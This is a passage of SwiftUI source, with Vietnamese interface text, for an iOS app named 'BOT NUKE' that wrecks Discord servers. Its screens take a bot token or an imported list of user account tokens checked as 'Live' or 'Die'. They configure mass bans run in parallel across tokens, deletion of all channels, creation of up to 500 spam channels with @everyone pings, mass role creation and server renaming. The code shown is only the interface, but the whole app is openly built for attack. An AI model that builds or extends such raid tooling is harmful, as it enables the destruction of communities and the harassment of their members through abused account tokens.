                Text("BOT NUKE").font(.largeTitle.bold()).padding(.top, 30)

                VStack(alignment: .leading, spacing: 12) {
                    Text("BOT TOKEN").font(.caption).bold().foregroundStyle(.secondary)
                    SecureField("Dán bot token...", text: $tokenInput)
                        .textInputAutocapitalization(.never).autocorrectionDisabled()
                        .padding(12).background(Color(UIColor.tertiarySystemBackground))
                        .cornerRadius(10).font(.system(.body, design: .monospaced))
                    Text("Developer Portal → Applications → Bot → Reset Token")
                        .font(.caption2).foregroundStyle(.secondary)
                }
                .padding().background(Color(UIColor.secondarySystemBackground)).cornerRadius(15)

                if let e = bot.tokenError {
                    Text(e).font(.caption).foregroundStyle(.red).multilineTextAlignment(.center)
                }

                Button(action: { Task { await bot.setToken(tokenInput) } }) {
                    HStack {
                        if bot.isCheckingToken { ProgressView().tint(.white) }
                        Text(bot.isCheckingToken ? "Đang kiểm tra..." : "KẾT NỐI BOT").bold()
                    }.frame(maxWidth: .infinity).padding()
                }
                .background(Color.red).foregroundStyle(.white).cornerRadius(12)
                .disabled(tokenInput.isEmpty || bot.isCheckingToken)
                .opacity(tokenInput.isEmpty ? 0.5 : 1)

                VStack(alignment: .leading, spacing: 8) {
                    Text("YÊU CẦU").font(.caption).bold().foregroundStyle(.secondary)
                    Text("- Bot đã vào server cần nuke").font(.caption)
                    Text("- Bật Server Members Intent").font(.caption)
                    Text("- Quyền Administrator").font(.caption)
                }
                .frame(maxWidth: .infinity, alignment: .leading)
                .padding().background(Color(UIColor.secondarySystemBackground)).cornerRadius(12)
            }.padding()
        }
    }
}

struct BotGuildListView: View {
    @EnvironmentObject var bot: BotManager
    @Binding var selectedGuild: Guild?
    @State private var searchText = ""

    var filtered: [Guild] {
        searchText.isEmpty ? bot.botGuilds : bot.botGuilds.filter { $0.name.localizedCaseInsensitiveContains(searchText) }
    }

    var body: some View {
        VStack(spacing: 0) {
            if let cfg = bot.config {
                HStack(spacing: 12) {
                    AvatarView(url: cfg.avatarURL, initial: cfg.initial, size: 42)
                    VStack(alignment: .leading, spacing: 2) {
                        Text(cfg.displayName).font(.subheadline.bold())
                        Text("Bot ID: \(cfg.userId)").font(.caption2).foregroundStyle(.secondary)
                    }
                    Spacer()
                    Menu {
                        Button("Đổi token") { bot.removeConfig() }
                        Button("Refresh") { Task { await bot.loadGuilds() } }
                    } label: { Text("Menu").font(.caption.bold()) }
                }.padding().background(Color(UIColor.secondarySystemBackground))
            }

            if bot.isLoadingGuilds {
                ProgressView("Đang tải...").padding(.top, 40); Spacer()
            } else if bot.botGuilds.isEmpty {
                EmptyStateView(title: "Chưa có server", description: "Mời bot vào server rồi Refresh.")
            } else {
                List(filtered) { g in
                    Button { selectedGuild = g } label: {
                        HStack(spacing: 12) {
                            if let icon = g.icon,
                               let url = URL(string: "https://cdn.discordapp.com/icons/\(g.id)/\(icon).png?size=64") {
                                AsyncImage(url: url) { img in img.resizable().scaledToFill() }
                                placeholder: { Circle().fill(.gray.opacity(0.3)) }
                                    .frame(width: 42, height: 42).clipShape(Circle())
                            } else {
                                Circle().fill(Color.secondary.opacity(0.2))
                                    .overlay(Text(String(g.name.prefix(1)).uppercased())
                                                .font(.subheadline.bold()).foregroundStyle(.secondary))
                                    .frame(width: 42, height: 42)
                            }
                            VStack(alignment: .leading, spacing: 2) {
                                Text(g.name).font(.headline)
                                Text(g.id).font(.caption2).foregroundStyle(.secondary).monospaced()
                            }
                            Spacer()
                            Text("›").foregroundStyle(.tertiary).font(.title3)
                        }.padding(.vertical, 4)
                    }.buttonStyle(.plain)
                }.searchable(text: $searchText, prompt: "Tìm...")
            }
        }
    }
}

// Shared options view for both bot & user nuke
struct NukeOptionsView: View {
    @EnvironmentObject var bot: BotManager
    @EnvironmentObject var userNuke: UserNukeManager
    let guild: Guild
    @Binding var selectedGuild: Guild?
    let mode: NukeMode
    enum NukeMode { case bot, user }

    @State private var options = NukeConfig()

    var canRun: Bool {
        options.doMassBan || options.doDeleteChannels || options.doCreateRoles ||
        options.doCreateChannels || options.doRenameGuild
    }

    var body: some View {
        ScrollView {
            VStack(spacing: 14) {
                HStack {
                    Text("CẢNH BÁO").font(.caption.bold()).foregroundStyle(.orange)
                    Spacer()
                }.padding(12).background(Color.orange.opacity(0.15)).cornerRadius(10)

                HStack(spacing: 12) {
                    if let icon = guild.icon,
                       let url = URL(string: "https://cdn.discordapp.com/icons/\(guild.id)/\(icon).png?size=64") {
                        AsyncImage(url: url) { img in img.resizable().scaledToFill() }
                        placeholder: { Circle().fill(.gray.opacity(0.3)) }
                            .frame(width: 48, height: 48).clipShape(Circle())
                    } else {
                        Circle().fill(Color.secondary.opacity(0.2))
                            .overlay(Text(String(guild.name.prefix(1)).uppercased())
                                        .font(.title3.bold()).foregroundStyle(.secondary))
                            .frame(width: 48, height: 48)
                    }
                    VStack(alignment: .leading, spacing: 2) {
                        Text(guild.name).font(.headline)
                        Text(guild.id).font(.caption2.monospaced()).foregroundStyle(.secondary)
                    }
                    Spacer()
                    Button { selectedGuild = nil } label: {
                        Text("X").font(.caption.bold()).foregroundStyle(.secondary)
                            .padding(8).background(Color.secondary.opacity(0.15)).clipShape(Circle())
                    }
                }.padding().background(Color(UIColor.secondarySystemBackground)).cornerRadius(12)

                toggleSection("Mass Ban", $options.doMassBan) {
                    VStack(alignment: .leading, spacing: 8) {
                        Text(mode == .user
                             ? "Quét member qua WebSocket và ban song song bằng tất cả token."
                             : "Ban mọi member có role thấp hơn bot.")
                            .font(.caption2).foregroundStyle(.secondary)
                        if mode == .user {
                            TextField("Role ID để ban (trống = ban tất cả)", text: $options.banRoleId)
                                .keyboardType(.numberPad).textFieldStyle(.roundedBorder)
                        }
                    }
                }

                toggleSection("Xóa kênh", $options.doDeleteChannels) {
                    Text("Xóa toàn bộ kênh.").font(.caption2).foregroundStyle(.secondary)
                }

                toggleSection("Tạo kênh + Spam", $options.doCreateChannels) {
                    VStack(spacing: 10) {
                        TextField("Tên kênh", text: $options.channelName).textFieldStyle(.roundedBorder)
                        HStack {
                            Text("Số kênh:").font(.subheadline); Spacer()
                            Stepper("\(options.channelCount)", value: $options.channelCount, in: 1...500)
                        }
                        TextField("Nội dung tin nhắn", text: $options.messageContent, axis: .vertical)
                            .textFieldStyle(.roundedBorder).lineLimit(2...5)
                        Toggle("Tag @everyone", isOn: $options.tagEveryone).tint(.green)
                    }
                }

                toggleSection("Tạo Role", $options.doCreateRoles) {
                    VStack(spacing: 10) {
                        TextField("Tên role", text: $options.roleName).textFieldStyle(.roundedBorder)
                        HStack {
                            Text("Số role:").font(.subheadline); Spacer()
                            Stepper("\(options.roleCount)", value: $options.roleCount, in: 1...500)
                        }
                    }
                }

                toggleSection("Đổi tên Server", $options.doRenameGuild) {
                    TextField("Tên server mới", text: $options.newGuildName).textFieldStyle(.roundedBorder)
                }

                Button {
                    if mode == .bot { Task { await bot.runNuke(guild: guild, options: options) } }
                    else { Task { await userNuke.runNuke(guild: guild, options: options) } }
                } label: {
                    Text("BẮT ĐẦU NUKE").bold().frame(maxWidth: .infinity).padding()
                }
                .background(canRun ? Color.red : Color.gray)
                .foregroundStyle(.white).cornerRadius(12)
                .disabled(!canRun).padding(.top, 8)

                if !canRun {
                    Text("Chọn ít nhất 1 chức năng").font(.caption).foregroundStyle(.secondary)
                }
            }.padding()
        }
        .background(Color(UIColor.systemGroupedBackground))
    }

    @ViewBuilder
    func toggleSection<Content: View>(_ title: String,
                                       _ isOn: Binding<Bool>,
                                       @ViewBuilder content: () -> Content) -> some View {
        VStack(spacing: 0) {
            HStack {
                Text(title).font(.headline)
                Spacer()
                Toggle("", isOn: isOn).labelsHidden().tint(.indigo)
            }.padding()
            if isOn.wrappedValue {
                Divider()
                content().padding().frame(maxWidth: .infinity, alignment: .leading)
            }
        }
        .background(Color(UIColor.secondarySystemBackground)).cornerRadius(12)
    }
}

// Shared running UI
struct NukeRunningUI: View {
    let phase: String
    let progress: Double
    let banOk: Int
    let banFail: Int
    let chDel: Int
    let chCreate: Int
    let msgSent: Int
    let roleCreate: Int
    let log: [String]
    let onStop: () -> Void

    var body: some View {
        VStack(spacing: 0) {
            VStack(spacing: 8) {
                HStack {
                    Text("ĐANG NUKE").font(.title2.bold())
                    Spacer()
                    ProgressView().tint(.red)
                }
                HStack(spacing: 6) {
                    Circle().fill(.red).frame(width: 8, height: 8)
                    Text(phase.isEmpty ? "Đang khởi động..." : phase)
                        .font(.subheadline).foregroundStyle(.secondary)
                    Spacer()
                    Text("\(Int(progress * 100))%").font(.caption.bold()).foregroundStyle(.red)
                }
                ProgressView(value: progress).tint(.red)
            }
            .padding().background(Color.red.opacity(0.08))

            HStack(spacing: 8) {
                statCard("Ban", "\(banOk)/\(banOk+banFail)", .red)
                statCard("Xóa kênh", "\(chDel)", .orange)
                statCard("Tạo kênh", "\(chCreate)", .green)
                statCard("Role", "\(roleCreate)", .purple)
            }.padding(.horizontal).padding(.top, 10)

            ScrollViewReader { proxy in
                ScrollView {
                    LazyVStack(alignment: .leading, spacing: 2) {
                        ForEach(Array(log.enumerated()), id: \.offset) { i, line in
                            Text(line).font(.system(size: 11, design: .monospaced))
                                .frame(maxWidth: .infinity, alignment: .leading).id(i)
                        }
                    }.padding(12)
                }
                .background(Color(UIColor.secondarySystemBackground))
                .cornerRadius(12).padding(.horizontal).padding(.top, 10)
                .onChange(of: log.count) { _ in
                    if let last = log.indices.last {
                        withAnimation { proxy.scrollTo(last, anchor: .bottom) }
                    }
                }
            }

            Button(action: onStop) {
                Text("DỪNG LẠI").bold().frame(maxWidth: .infinity).padding()
            }.background(Color.red).foregroundStyle(.white).cornerRadius(12).padding()
        }
        .background(Color(UIColor.systemGroupedBackground))
        .navigationBarBackButtonHidden(true)
    }
    func statCard(_ title: String, _ value: String, _ color: Color) -> some View {
        VStack(spacing: 2) {
            Text(value).font(.title3.bold()).foregroundStyle(color)
            Text(title).font(.caption2).foregroundStyle(.secondary)
        }.frame(maxWidth: .infinity).padding(.vertical, 8)
        .background(Color(UIColor.secondarySystemBackground)).cornerRadius(10)
    }
}

struct BotNukeRunningView: View {
    @EnvironmentObject var bot: BotManager
    var body: some View {
        NukeRunningUI(phase: bot.currentPhase, progress: bot.phaseProgress,
                      banOk: bot.banSuccess, banFail: bot.banFailed,
                      chDel: bot.channelsDeleted, chCreate: bot.channelsCreated,
                      msgSent: bot.messagesSent, roleCreate: bot.rolesCreated,
                      log: bot.nukeLog, onStop: { bot.stopNuke() })
    }
}

// ==========================================
// MARK: - USER NUKE VIEWS
// ==========================================
struct UserNukeView: View {
    @EnvironmentObject var userNuke: UserNukeManager
    @State private var selectedGuild: Guild?

    var body: some View {
        NavigationStack {
            Group {
                if userNuke.isNuking { UserNukeRunningView() }
                else if let g = selectedGuild { NukeOptionsView(guild: g, selectedGuild: $selectedGuild, mode: .user) }
                else if userNuke.selectedTokenIds.isEmpty { UserNukeTokenPickerView(selectedGuild: $selectedGuild) }
                else { UserNukeGuildListView(selectedGuild: $selectedGuild) }
            }
            .navigationTitle(navTitle).navigationBarTitleDisplayMode(.inline)
        }
    }
    private var navTitle: String {
        if userNuke.isNuking { return "Đang chạy..." }
        if let g = selectedGuild { return g.name }
        if userNuke.selectedTokenIds.isEmpty { return "User — Chọn Token" }
        return "User — Chọn Server"
    }
}

struct UserNukeTokenPickerView: View {
    @EnvironmentObject var userNuke: UserNukeManager
    @Binding var selectedGuild: Guild?
    @State private var showImport = false

    var body: some View {
        VStack(spacing: 0) {
            HStack(spacing: 10) {
                Button(action: { showImport = true }) {
                    Text("Import tokens").font(.subheadline.bold())
                        .frame(maxWidth: .infinity).padding(12)
                }.background(Color.indigo).foregroundStyle(.white).cornerRadius(10)

                if !userNuke.tokens.isEmpty {
                    Menu {
                        Button("Xóa tất cả", role: .destructive) { userNuke.clearAll() }
                    } label: {
                        Text("Menu").font(.caption.bold()).padding(12)
                            .background(Color(UIColor.secondarySystemBackground)).cornerRadius(10)
                    }
                }
            }.padding(.horizontal).padding(.top, 8)

            if userNuke.isImporting {
                ProgressView("Đang kiểm tra...").padding(30)
            }

            if userNuke.tokens.isEmpty {
                EmptyStateView(title: "Chưa có token user",
                               description: "Import file .txt (mỗi dòng 1 token) để bắt đầu.")
            } else {
                List {
                    Section(header: Text("Chọn token (\(userNuke.selectedTokenIds.count) đã chọn)")) {
                        ForEach(userNuke.tokens) { token in
                            HStack(spacing: 12) {
                                Button {
                                    userNuke.toggleSelection(token)
                                } label: {
                                    ZStack {
                                        Circle()
                                            .strokeBorder(userNuke.selectedTokenIds.contains(token.id)
                                                          ? Color.indigo : Color.secondary.opacity(0.4),
                                                          lineWidth: 1.5)
                                            .frame(width: 22, height: 22)
                                        if userNuke.selectedTokenIds.contains(token.id) {
                                            Circle().fill(Color.indigo).frame(width: 12, height: 12)
                                        }
                                    }
                                }
                                .buttonStyle(.plain)
                                .disabled(!token.isValid)

                                AvatarView(url: token.avatarURL, initial: token.initial, size: 36)

                                VStack(alignment: .leading, spacing: 2) {
                                    Text(token.username).font(.subheadline.bold())
                                    Text(token.isValid ? "Live" : "Die").font(.caption2).bold()
                                        .foregroundStyle(token.isValid ? .green : .red)
                                }
                                Spacer()
                                Button { userNuke.removeToken(token.id) } label: {
                                    Text("X").font(.caption.bold()).foregroundStyle(.secondary)
                                        .padding(8).background(Color.secondary.opacity(0.15)).clipShape(Circle())
                                }.buttonStyle(.plain)
                            }.opacity(token.isValid ? 1 : 0.5)
                        }
                    }
                }
            }

            if !userNuke.selectedTokenIds.isEmpty {
                Button(action: {
                    Task { await userNuke.loadAllGuildsForSelected() }
                }) {
                    HStack {
                        if userNuke.isLoadingGuilds { ProgressView().tint(.white) }
                        Text("TIẾP TỤC (\(userNuke.selectedTokenIds.count) token)").bold()
                    }.frame(maxWidth: .infinity).padding()
                }
                .background(Color.indigo).foregroundStyle(.white).cornerRadius(12)
                .padding(.horizontal).padding(.bottom, 8)
                .disabled(userNuke.isLoadingGuilds)
            }
        }
        .sheet(isPresented: $showImport) {
            DocumentPicker(contentTypes: [.item]) { url in
                Task { await userNuke.importFromFile(url: url) }
            }
        }
    }
}

struct UserNukeGuildListView: View {
    @EnvironmentObject var userNuke: UserNukeManager
    @Binding var selectedGuild: Guild?
    @State private var searchText = ""

    var filtered: [Guild] {
        searchText.isEmpty ? userNuke.eligibleGuilds : userNuke.eligibleGuilds.filter { $0.name.localizedCaseInsensitiveContains(searchText) }
    }

    var body: some View {
        VStack(spacing: 0) {
            HStack(spacing: 8) {
                Text("Server mà TẤT CẢ \(userNuke.selectedTokenIds.count) token đều có quyền")
                    .font(.caption).foregroundStyle(.secondary)
                Spacer()
                Button { Task { await userNuke.loadAllGuildsForSelected() } } label: {
                    Text("Refresh").font(.caption.bold()).padding(8)
                }
            }.padding(.horizontal).padding(.vertical, 8)
            .background(Color.green.opacity(0.1))

            if userNuke.isLoadingGuilds {
                ProgressView("Đang tải...").padding(40); Spacer()
            } else if userNuke.eligibleGuilds.isEmpty {
                EmptyStateView(title: "Không có server chung",
                               description: "Tất cả token phải cùng ở server và đủ quyền (Admin hoặc Manage Server + Manage Channels + Ban).")
            } else {
                List(filtered) { g in
                    Button { selectedGuild = g } label: {
                        HStack(spacing: 12) {
                            if let icon = g.icon,
                               let url = URL(string: "https://cdn.discordapp.com/icons/\(g.id)/\(icon).png?size=64") {
                                AsyncImage(url: url) { img in img.resizable().scaledToFill() }
                                placeholder: { Circle().fill(.gray.opacity(0.3)) }
                                    .frame(width: 42, height: 42).clipShape(Circle())
                            } else {
                                Circle().fill(Color.secondary.opacity(0.2))
                                    .overlay(Text(String(g.name.prefix(1)).uppercased())
                                                .font(.subheadline.bold()).foregroundStyle(.secondary))
                                    .frame(width: 42, height: 42)
                            }
                            VStack(alignment: .leading, spacing: 2) {
                                Text(g.name).font(.headline)
                                Text(g.id).font(.caption2).foregroundStyle(.secondary).monospaced()
                            }
                            Spacer()
                            Text("›").foregroundStyle(.tertiary).font(.title3)
                        }.padding(.vertical, 4)
                    }.buttonStyle(.plain)
                }.searchable(text: $searchText, prompt: "Tìm...")
            }
        }
    }
}

struct UserNukeRunningView: View {
    @EnvironmentObject var userNuke: UserNukeManager
    var body: some View {
        NukeRunningUI(phase: userNuke.currentPhase, progress: userNuke.phaseProgress,
                      banOk: userNuke.banSuccess, banFail: userNuke.banFailed,
                      chDel: userNuke.channelsDeleted, chCreate: userNuke.channelsCreated,
                      msgSent: userNuke.messagesSent, roleCreate: userNuke.rolesCreated,
                      log: userNuke.nukeLog, onStop: { userNuke.stop() })
    }
}